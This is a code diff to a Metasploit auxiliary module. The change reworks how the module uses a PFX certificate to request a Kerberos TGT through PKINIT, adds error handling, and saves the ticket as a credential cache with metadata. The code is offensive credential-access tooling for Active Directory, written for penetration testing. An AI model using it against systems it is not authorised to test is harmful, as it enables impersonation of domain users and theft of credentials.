@@ -51,12 +51,27 @@ class MetasploitModule < Msf::Auxiliary
       print_error('Domain override provided but no username override provided (must provide both or neither)')
       return
     end
-    tgt_result, key = send_request_tgt_pkinit(pfx: pfx,
-                                              username: datastore['USERNAME'],
-                                              realm: datastore['DOMAIN'])
-    enc_part = decrypt_kdc_as_rep_enc_part(tgt_result.as_rep, key)
-    ccache = Rex::Proto::Kerberos::CredentialCache::Krb5Ccache.from_responses(tgt_result.as_rep, enc_part)
-    path = store_loot('mit.kerberos.ccache', 'application/octet-stream', rhost, ccache.encode, nil)
-    print_status("#{peer} - TGT MIT Credential Cache saved to #{path}")
+    username, realm = extract_user_and_realm(pfx.certificate, datastore['USERNAME'], datastore['DOMAIN'])
+    print_status("Attempting PKINIT login for #{username}@#{realm}")
+    begin
+      server_name = "krbtgt/#{realm}"
+      tgt_result, key = send_request_tgt_pkinit(pfx: pfx,
+                                                username: username,
+                                                realm: realm,
+                                                server_name: server_name)
+      print_good("Successfully authenticated with certificate")
+      enc_part = decrypt_kdc_as_rep_enc_part(tgt_result.as_rep, key)
+
+      info = []
+      info << "realm: #{realm.upcase}"
+      info << "serviceName: #{server_name.downcase}"
+      info << "username: #{username.downcase}"
+
+      ccache = Rex::Proto::Kerberos::CredentialCache::Krb5Ccache.from_responses(tgt_result.as_rep, enc_part)
+      path = store_loot('mit.kerberos.ccache', 'application/octet-stream', rhost, ccache.encode, nil, info.join(', '))
+      print_status("#{peer} - TGT MIT Credential Cache saved to #{path}")
+    rescue Rex::Proto::Kerberos::Model::Error::KerberosError => e
+      print_error("Failed: #{e.message}")
+    end
   end
 end
